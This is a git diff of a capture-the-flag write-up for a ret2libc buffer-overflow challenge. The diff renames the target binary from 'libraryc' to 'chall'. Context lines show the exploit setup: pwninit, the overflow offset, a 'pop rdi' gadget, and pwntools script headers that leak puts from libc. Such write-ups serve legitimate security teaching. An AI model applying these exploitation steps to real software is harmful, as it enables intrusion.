@@ -31,7 +31,7 @@ https://github.com/io12/pwninit
 
 Do the following:
 ```sh
-./pwninit --bin libraryc --lib libc.so.6
+./pwninit --bin chall --lib libc.so.6
 ```
 
 This should provide you with the newly installed libc and linker.
@@ -108,7 +108,7 @@ Found at offset 72
 We need `rdi` register to pass the argument.
 
 ```sh
-$> ROPgadget --binary libraryc_patched | grep "pop rdi"
+$> ROPgadget --binary chall_patched | grep "pop rdi"
 0x0000000000400653 : pop rdi ; ret
 ```
 
@@ -117,11 +117,11 @@ $> ROPgadget --binary libraryc_patched | grep "pop rdi"
 from pwn import *
 
 # setup the binary
-elf = ELF("./libraryc_patched")
+elf = ELF("./chall_patched")
 libc = ELF("./libc.so.6")
 ld = ELF("./ld-2.39.so")
 
-p = process("./libraryc_patched")
+p = process("./chall_patched")
 context.binary = elf
 
 # leaking puts@libc
@@ -183,11 +183,11 @@ With that, let's put everything together.
 from pwn import *
 
 # setup the binary
-elf = ELF("./libraryc_patched")
+elf = ELF("./chall_patched")
 libc = ELF("./libc.so.6")
 ld = ELF("./ld-2.39.so")
 
-p = process("./libraryc_patched")
+p = process("./chall_patched")
 context.binary = elf
 
 
@@ -233,7 +233,7 @@ However, we will face this still:
 
 ```sh
 $ 
-[*] Process './libraryc_patched' stopped with exit code -11 (SIGSEGV) (pid 161176)
+[*] Process './chall_patched' stopped with exit code -11 (SIGSEGV) (pid 161176)
 [*] Got EOF while sending in interactive
 ```
 
@@ -256,11 +256,11 @@ In this case i have done number 2.
 from pwn import *
 
 # setup the binary
-elf = ELF("./libraryc_patched")
+elf = ELF("./chall_patched")
 libc = ELF("./libc.so.6")
 ld = ELF("./ld-2.39.so")
 
-p = process("./libraryc_patched")
+p = process("./chall_patched")
 context.binary = elf
 
 
@@ -310,8 +310,8 @@ refer to solve.py
 2. might wanna check out: https://stackoverflow.com/questions/54393105/libcs-system-when-the-stack-pointer-is-not-16-padded-causes-segmentation-faul
 
 ## Attached Files
-- libraryc
-- libraryc.c
+- chall
+- chall.c
 - libc.so.6
 
 ## Resources
